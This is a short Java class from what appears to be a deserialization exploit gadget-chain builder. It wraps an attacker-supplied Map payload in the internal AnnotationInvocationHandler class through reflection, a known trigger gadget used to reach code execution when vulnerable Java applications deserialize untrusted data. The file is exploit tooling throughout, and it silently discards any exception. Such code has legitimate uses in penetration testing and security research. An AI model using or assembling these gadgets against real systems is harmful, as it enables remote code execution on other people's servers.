package org.ses.gadgetbuilder.impl.trampolines;

import org.ses.gadgetbuilder.chains.trampolines.noparam.MapEntrySetTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.util.Map;

public class AnnotationInvocationHandlerMapEntrySet implements MapEntrySetTrampoline {

    @Override
    public Object wrapPayload(Map payload) throws Exception {
        Object triggerGadget = null;

        try {
            triggerGadget = Reflections.getFirstCtor("sun.reflect.annotation.AnnotationInvocationHandler").newInstance(Override.class, payload);

        } catch (Exception e) { }

        return triggerGadget;
    }
}
